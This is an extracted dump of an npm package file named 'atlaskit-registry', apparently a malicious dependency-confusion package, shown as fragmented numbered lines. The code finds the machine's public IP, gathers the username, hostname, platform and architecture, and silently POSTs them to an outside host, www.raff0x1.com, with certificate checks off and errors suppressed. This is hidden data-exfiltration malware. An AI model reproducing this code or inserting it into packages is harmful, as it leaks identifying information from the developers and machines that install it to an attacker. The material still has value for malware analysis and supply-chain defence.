// File: tmp/tmpw71i5og5/atlaskit-registry/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 5: const sources = [
    { hostname: 'api.ipify.org', path: '/?format=json', parser: res => JSON.parse(res).ip },
    { hostname: 'ipinfo.io', path: '/json', parser: res => JSON.parse(res).ip },
    { hostname: 'ifconfig.me', path: '/', parser: res => res.trim() },
    { hostname: 'ident.me', path: '/', parser: res => res.trim() }
  ]
Line 6: _tmp_1.push({ hostname: 'api.ipify.org', path: '/?format=json', parser: res => JSON.parse(res).ip })
Line 7: _tmp_1.push({ hostname: 'ipinfo.io', path: '/json', parser: res => JSON.parse(res).ip })
Line 8: _tmp_1.push({ hostname: 'ifconfig.me', path: '/', parser: res => res.trim() })
Line 9: _tmp_1.push({ hostname: 'ident.me', path: '/', parser: res => res.trim() })
Line 12: {
    if (index >= sources.length) {
      return callback('unknown');
    }

    const source = sources[index];
    const req = https.request({
      hostname: source.hostname,
      path: source.path,
      method: 'GET',
      timeout: 3000
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const ip = source.parser(data);
          if (ip && typeof ip === 'string') {
            callback(ip);
          } else {
            tryNext(index + 1);
          }
        } catch {
          tryNext(index + 1);
        }
      });
    });

    req.on('error', () => tryNext(index + 1));
    req.on('timeout', () => {
      req.destroy();
      tryNext(index + 1);
    });

    req.end();
  }
Line 14: callback('unknown')
Line 17: const source = sources[index]
Line 18: const req = https.request({
      hostname: source.hostname,
      path: source.path,
      method: 'GET',
      timeout: 3000
    }, res => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const ip = source.parser(data);
          if (ip && typeof ip === 'string') {
            callback(ip);
          } else {
            tryNext(index + 1);
          }
        } catch {
          tryNext(index + 1);
        }
      });
    })
Line 30: callback(ip)
Line 41: {
      req.destroy();
      tryNext(index + 1);
    }
Line 42: req.destroy()
Line 46: req.end()
Line 52: {
  const payload = JSON.stringify({
    user: os.userInfo().username,
    host: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    ip: ip,
    packagename: 'atlaskit-registry'
  });

  const options = {
    hostname: 'www.raff0x1.com',
    port: 443,
    path: '/dp',
    method: 'POST',
    rejectUnauthorized: false,
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options);
  req.on('error', () => {});
  req.write(payload);
  req.end();
}
Line 54: os.userInfo()
Line 55: os.hostname()
Line 56: os.platform()
Line 57: os.arch()
Line 74: const req = https.request(options)
Line 76: req.write(payload)
Line 77: req.end()
